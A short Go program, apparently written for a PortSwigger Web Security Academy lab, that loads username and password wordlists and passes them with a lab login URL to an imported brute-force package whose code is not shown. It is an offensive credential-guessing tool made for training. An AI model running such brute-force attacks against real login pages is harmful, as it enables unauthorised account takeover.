package main

import (
	"flag"
	"io"
	"log"
	"os"
	bruteforcer "portswinger/brute/bruteForcer"
)

// Set Up Url Var
var (
	urlPost string = "https://0a55008903e507ee82a1e30900d1000b.web-security-academy.net/login"
)

func main() {

	//Flags for Number of goroutines
	threads := flag.Int("t", 1, "Set Number of GoRoutines")
	flag.Parse()

	//Open Credentials Word Lists
	usernameFile, err := os.OpenFile("./usernames.txt", os.O_RDONLY, 0644)
	if err != nil {
		log.Fatal("Did Not Found usernames.txt file")
	}

	passwordFile, err := os.OpenFile("./passwords.txt", os.O_RDONLY, 0644)
	if err != nil {
		log.Fatal("Did Not Found usernames.txt file")
	}

	usernames, err := io.ReadAll(usernameFile)
	if err != nil {
		log.Fatal("Did Not Found usernames.txt file")
	}

	passwords, err := io.ReadAll(passwordFile)
	if err != nil {
		log.Fatal("Did Not Found usernames.txt file")
	}

	//Run Brute Force Attack
	bruteforcer.BruteForcer(urlPost, usernames, passwords, threads)
}
